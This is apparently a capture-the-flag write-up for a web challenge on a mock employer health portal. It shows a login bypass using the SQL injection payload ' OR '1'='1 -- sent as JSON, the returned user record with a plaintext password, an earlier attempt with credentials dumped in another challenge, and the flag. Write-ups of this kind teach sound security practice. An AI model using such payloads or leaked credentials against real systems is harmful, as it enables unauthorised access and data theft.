# Doctor Appointment (1 of 4 series) — Web (26 pts)

The Health Spark Employer Portal at http://45.79.200.170:3000. Part 1 of the series — get in.

## How I solved it

Tried the creds from GhostTown first (the DoomScroll password dump — john.doe:Welcome1!, rachel.kim, etc.) — all 401.

Then I actually read the page's inline JS comments, which basically signpost it: *"SQLi disclosure, HTTP 200 with no token"*. The login endpoint takes JSON, so:

```json
POST /api/login
{"username":"' OR '1'='1 --", "password":"x"}
```

HTTP 200, and it dumps the first row straight back as JSON:

```json
{"username":"john.smith","name":"John Smith","departmentid":10685,
 "password":"Locked_In_And_Ready","flag":"deadface{typical_and_classic}"}
```

## Flag

```
deadface{typical_and_classic}
```
